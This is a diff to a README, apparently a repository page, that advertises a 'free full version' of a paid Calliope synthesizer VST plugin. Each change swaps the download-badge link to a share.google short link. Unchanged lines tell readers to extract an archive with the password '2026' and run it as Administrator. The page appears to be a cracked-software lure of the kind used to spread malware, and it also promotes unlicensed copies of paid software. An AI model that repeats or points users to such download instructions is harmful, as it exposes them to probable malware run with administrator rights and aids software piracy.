@@ -9,7 +9,7 @@ The **🎵 Calliope VST Free** is a **free** full version of the professional sy
 
 <div align="center">
 
-[![Download Calliope VST Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/calliope-vst-free)
+[![Download Calliope VST Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/y4ACujN1s9mbqGzH0)
 
 </div>
 
@@ -116,7 +116,7 @@ Professional VST plugins can cost hundreds of dollars. This free full version gi
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Follow setup instructions
 
-[![Download Calliope VST Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/calliope-vst-free)
+[![Download Calliope VST Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/y4ACujN1s9mbqGzH0)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -260,7 +260,7 @@ Get a professional synthesizer VST for free. **Calliope VST Free** is the comple
 
 <div align="center">
 
-[![Download Calliope VST Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/calliope-vst-free)
+[![Download Calliope VST Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/y4ACujN1s9mbqGzH0)
 
 **Version 4.6.1** — Free full VST plugin. April 2026 update. Zero cost. No payment.
 
